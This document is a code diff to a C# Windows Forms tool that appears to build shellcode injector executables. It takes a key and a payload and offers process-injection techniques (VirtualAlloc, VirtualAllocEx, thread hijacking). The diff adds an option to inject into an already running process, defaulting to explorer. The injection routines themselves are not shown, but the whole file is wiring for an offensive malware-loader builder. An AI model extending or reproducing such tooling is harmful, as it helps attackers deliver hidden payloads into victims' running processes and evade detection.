@@ -59,6 +59,7 @@ namespace WindowsFormsApp1
             ThreadHijacking thrHijacking = null;
             VirtualAllocTech virtualAllocT = null;
             VirtualAllocExTech virtualAllocExT = null;
+            VirtualAllocEx_existing_APP_Tech virtualAllocEx_existing = null;
 
             if (archX64.Checked)
                 architecture = " /platform:x64";
@@ -76,6 +77,13 @@ namespace WindowsFormsApp1
                     procBox.Text = "notepad.exe(32)";
                     virtualAllocExT = new VirtualAllocExTech(keyBox.Text, resultBox.Text.Replace("\r\n", ""),procBox.Text);
                     compiler.compileToExe(virtualAllocExT.GetCode(), keyBox.Text, filepath, architecture);
+                }
+                else if (injectExistingApp.Checked)
+                {
+                    procBox.Enabled = true;
+                    procBox.Text = "explorer";
+                    virtualAllocEx_existing = new VirtualAllocEx_existing_APP_Tech(keyBox.Text, resultBox.Text.Replace("\r\n", ""), procBox.Text);
+                    compiler.compileToExe(virtualAllocEx_existing.GetCode(), keyBox.Text, filepath, architecture);
                 }
                 else if (threadHijacking_option.Checked)
                 {
@@ -122,12 +130,18 @@ namespace WindowsFormsApp1
                 procBox.Text = "notepad.exe(32)";
             else if (virtualAlloc_Option.Checked)
                 procBox.Text = "none";
-
+            procBox.Enabled = false;
         }
 
         private void threadHijacking_option_CheckedChanged(object sender, EventArgs e)
         {
             archX64.Checked = true;
+        }
+
+        private void injectExistingApp_CheckedChanged(object sender, EventArgs e)
+        {
+            procBox.Text = "explorer";
+            procBox.Enabled = true;
         }
     }
 }
